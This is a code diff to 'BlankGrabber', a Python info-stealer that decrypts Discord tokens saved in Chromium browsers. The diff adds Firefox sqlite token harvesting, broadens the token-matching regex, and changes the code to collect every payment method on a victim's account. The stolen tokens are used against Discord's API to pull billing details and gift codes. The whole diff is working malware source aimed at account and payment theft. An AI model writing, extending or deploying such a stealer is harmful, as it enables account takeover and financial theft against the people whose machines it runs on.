@@ -417,7 +417,8 @@ class BlankGrabber:
             "Sputnik": os.path.join(self.localappdata, "Sputnik", "Sputnik", "User Data"),
             "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
             "Chrome SxS": os.path.join(self.localappdata, "Google", "Chrome SxS", "User Data"),
-            "Chrome": os.path.join(self.chromefolder),
+            "Chrome": self.chromefolder,
+            "FireFox" : self.roaming + "\\Mozilla\\Firefox\\Profiles",
             "Epic Privacy Browse": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
             "Microsoft Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
             "Uran": os.path.join(self.localappdata, "uCozMedia", "Uran", "User Data"),
@@ -427,11 +428,13 @@ class BlankGrabber:
         }
 
         def RickRollDecrypt(path):
+
             @catch
             def decrypt_token(encrypted_token, key):
                 return force_decode(pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16])
 
             encrypted_tokens = []
+            localstatepath = localstatepath = os.path.join(path, "Local State")
             with open(localstatepath, "r", errors= "ignore") as keyfile:
                 try:
                     key = json.load(keyfile)["os_crypt"]["encrypted_key"]
@@ -461,17 +464,31 @@ class BlankGrabber:
                 if not filename.endswith((".log", ".ldb")):
                     continue
                 for line in [x.strip() for x in open(os.path.join(path, filename), errors="ignore").readlines() if x.strip()]:
-                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"[\w]{24}\.[\w]{6}\.[\w]{40}", r"[\w]{26}\.[\w]{6}\.[\w]{38}"):
-                        for token in re.findall(reg, line):
+                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
+                        if not token in self.tokens:
+                            self.tokens.append(token)
+        
+        def firefoxtokgrab(path):
+            search = force_decode(subprocess.run("where /r . *.sqlite", shell= True, capture_output= True, cwd = path).stdout)
+            if search is not None:
+                for path in search.splitlines():
+                    if not os.path.isfile(path):
+                        continue
+                    for line in [x.strip() for x in open(path, errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                             if not token in self.tokens:
                                 self.tokens.append(token)
 
         token_threads = []
 
         for path in paths.items():
-            localstatepath = os.path.join(path[1], "Local State")
             if not os.path.exists(path[1]):
                 continue
+            elif path[0] in ("FireFox"):
+                if path[0] == "FireFox":
+                    t = threading.Thread(target= lambda: firefoxtokgrab(path[1]))
+                    token_threads.append(t)
+                    t.start()
             else:
                 t = threading.Thread(target= lambda: RickRollDecrypt(path[1]))
                 token_threads.append(t)
@@ -513,17 +530,16 @@ class BlankGrabber:
                 if len(billing) == 0:
                     billing = "(No Payment Method)"
                 else:
+                    methods = []
                     for m in billing:
                         method_type = m.get("type", 0)
                         if method_type == 0:
-                            billing = "(Unknown)"
-                            break
+                            methods.append("(Unknown)")
                         elif method_type == 1:
-                            billing = "Card"
-                            break
+                            methods.append("Card")
                         else:
-                            billing = "Paypal"
-                            break
+                            methods.append("Paypal")
+                    billing = ", ".join(methods)
                 gifts = []
                 r = self.http.request("GET", "https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers= self.headers(token)).data.decode()
                 if "code" in r:
